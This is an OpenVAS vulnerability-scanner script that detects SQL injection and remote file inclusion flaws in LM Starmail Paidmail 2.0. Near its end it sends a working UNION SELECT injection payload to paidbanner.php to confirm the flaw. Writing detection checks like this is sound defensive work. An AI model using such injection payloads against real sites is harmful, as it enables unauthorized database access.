##############################################################################
# OpenVAS Vulnerability Test
#
# LM Starmail SQL Injection and Remote File Inclusion Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902099");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-08-30 16:09:21 +0200 (Mon, 30 Aug 2010)");
  script_cve_id("CVE-2009-4993", "CVE-2009-4992");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("LM Starmail Paidmail SQL Injection and Remote File Inclusion Vulnerabilities");
  script_xref(name:"URL", value:"http://inj3ct0r.com/exploits/5624");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaw caused by improper validation of user-supplied input via the 'ID'
  parameter to 'paidbanner.php' and 'page' parameter to 'home.php'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running LM Starmail Paidmail and is prone SQL Injection
  and Remote File Inclusion Vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.");

  script_tag(name:"affected", value:"LM Starmail Paidmail version 2.0");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/lm_starmail_paidmail", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if("<title> LM Starmail" >< res)
  {
    req = http_get(item:string(dir, "/paidbanner.php?ID=-1+union+select+1,2,3" +
                        ",4,5,user(),7,8,9,10--"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if("mysql_fetch_array(): supplied argument is not a valid MySQL result resource" >< res){
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
